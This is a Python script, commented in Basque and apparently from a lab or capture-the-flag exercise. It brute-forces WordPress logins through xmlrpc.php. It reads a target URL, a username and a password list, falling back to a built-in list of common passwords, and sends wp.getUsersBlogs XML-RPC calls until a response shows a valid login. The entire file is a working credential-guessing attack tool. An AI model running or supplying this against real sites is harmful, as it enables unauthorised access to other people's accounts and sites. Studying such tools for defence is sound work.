import requests
import os

os.system("clear")
print("--------------------------------")
print("|   XMLRPC INDAR BASATIA       |")
print("--------------------------------")

url = input("URL biktima (adib: http://10.0.0.10): ")
erabiltz = input("Erabiltzaile izena (adibidez: admin): ")
fitx = input("Pasahitz zerrenda fitxategia: ")

if not url.startswith("http"):
    url = f"http://{url}"

xmlrpc_url = f"{url}/xmlrpc.php" 

try:
    pasahitzak = open(fitx).read().splitlines()  #fitxategiko lerro bakoitza pasahitz bat da
except:
    pasahitzak = ["admin", "password", "7ujm8ik,9ol.", "123456", "admin123", "wordpress", "technova"]  #fitxategirik ez badago hauek probatzen ditut
    print(f"pasahitz arruntak probatzen ditut ez dagoelako hiztegirik")

print(f"\n[*] {len(pasahitzak)} pasahitz probatzen {xmlrpc_url}-n\n")

for pasahitza in pasahitzak:
    payload = f"""<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>{erabiltz}</value></param>
<param><value>{pasahitza}</value></param>
</params></methodCall>"""  #XML formatua behar du xmlrpc, bestela ez du ulertzen

    try:
        r = requests.post(xmlrpc_url, data=payload, timeout=5)
        if "isAdmin" in r.text or "blogName" in r.text:  #gauza hau agertzen bada erantzunean esan nahi du pasahitza zuzena dela
            print(f"PASAHITZA: {erabiltz}:{pasahitza}")
            break
    except:
        print(f"XMLRPC.php ez dago")  #xmlrpc.php fitxategia ez badago aktibatuta wordpress horretan errore hau agertzen da
        break

print("\n[+] Amaituta")
input("\nPulsatu intro tekla jaraitzeko")
